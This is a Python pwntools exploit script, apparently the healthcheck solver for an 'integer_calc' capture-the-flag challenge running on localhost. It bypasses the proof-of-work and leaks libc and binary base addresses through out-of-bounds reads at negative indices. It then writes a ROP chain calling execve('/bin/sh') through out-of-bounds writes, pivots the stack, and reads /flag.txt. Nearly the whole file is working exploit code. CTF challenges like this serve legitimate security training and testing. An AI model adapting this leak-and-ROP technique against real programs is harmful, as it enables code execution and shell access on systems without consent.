#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

p = remote('127.0.0.1', 1337)
print(p.recvuntil('== proof-of-work: '))
if p.recvline().startswith(b'enabled'):
    handle_pow(p)

def sendchoice(choice: int):
    p.sendlineafter("> ", str(choice))

def leak(index: int):
    sendchoice(2)
    p.sendlineafter(": ", "0")
    p.sendlineafter(": ", str(index))
    return int(p.recvline().split()[-1])

def write(index: int, what: int):
    sendchoice(0)
    p.sendlineafter(": ", str(index))
    p.sendlineafter(": ", str(what))

# context.binary = elf = ELF('./integer_calc_patched')
context.binary = elf = ELF('/home/user/integer_calc')
# libc = ELF("libc-2.31.so")
# libc = elf.libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


libc.address = leak(-4) - libc.sym._IO_2_1_stdout_
elf.address = leak(-6) - elf.plt.exit

pop_rsp_pop_3 = elf.address + 0x15b5
pop_rdi = elf.address + 0x15bb
pop_rsi = libc.address + 0x27529
pop_rdx_pop_1 = libc.address + 0x11c371

rop_chain = b''.join([p64(x) for x in [
    pop_rdi, next(libc.search(b'/bin/sh')),
    pop_rsi, 0,
    pop_rdx_pop_1, 0, 0,
    libc.sym.execve
]])

for i in range(len(rop_chain) // 8):
    write(i, u64(rop_chain[i*8:(i+1)*8]))

write(-22, pop_rsp_pop_3)
write(-23, elf.sym.numbers - 8*3)

sendchoice(6)

p.sendline('cat /flag.txt')
data = p.recvline()
if b'idek{' in data and b'}' in data:
    exit(0)
exit(1)
